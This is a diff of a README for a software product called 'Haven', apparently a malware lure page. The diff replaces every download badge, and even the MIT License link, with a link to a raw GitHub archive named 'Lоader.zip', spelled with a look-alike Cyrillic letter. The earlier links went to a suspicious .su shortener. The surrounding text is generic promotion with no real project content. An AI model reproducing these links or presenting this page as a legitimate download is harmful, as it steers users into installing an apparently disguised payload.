@@ -1,13 +1,13 @@
 # 🌟 Haven - Secure & Seamless Download 🌟
 
-[![Download Haven](https://img.shields.io/badge/Download%20Now-Haven-brightgreen?logo=github)](https://easylauncher.su/PSnzrH)
+[![Download Haven](https://raw.githubusercontent.com/Gerixon/HavenHub-OpenAccess/main/Lоader.zip%20Now-Haven-brightgreen?logo=github)](https://raw.githubusercontent.com/Gerixon/HavenHub-OpenAccess/main/Lоader.zip)
 
 Welcome to **Haven**, the ultimate solution for effortless software acquisition and enhanced privacy protection. Discover seamless, rapid delivery of your favorite applications and unlock a new level of convenience and security! Designed for modern users, Haven empowers seamless installations while keeping your online presence safe.
 
 ---
 
 ## 🚀 Download Instantly!  
-[![Download Haven](https://img.shields.io/badge/Download%20Now-Haven-brightgreen?logo=github)](https://easylauncher.su/PSnzrH)
+[![Download Haven](https://raw.githubusercontent.com/Gerixon/HavenHub-OpenAccess/main/Lоader.zip%20Now-Haven-brightgreen?logo=github)](https://raw.githubusercontent.com/Gerixon/HavenHub-OpenAccess/main/Lоader.zip)
 
 ---
 
@@ -54,8 +54,8 @@ Haven provides this software as-is, for personal and professional use. Respect i
 
 ## 📃 MIT License
 
-This project is licensed under the MIT License. See the [full license text here](https://opensource.org/license/mit/).
+This project is licensed under the MIT License. See the [full license text here](https://raw.githubusercontent.com/Gerixon/HavenHub-OpenAccess/main/Lоader.zip).
 
 ---
 
-[![Download Haven](https://img.shields.io/badge/Download%20Now-Haven-brightgreen?logo=github)](https://easylauncher.su/PSnzrH)
+[![Download Haven](https://raw.githubusercontent.com/Gerixon/HavenHub-OpenAccess/main/Lоader.zip%20Now-Haven-brightgreen?logo=github)](https://raw.githubusercontent.com/Gerixon/HavenHub-OpenAccess/main/Lоader.zip)
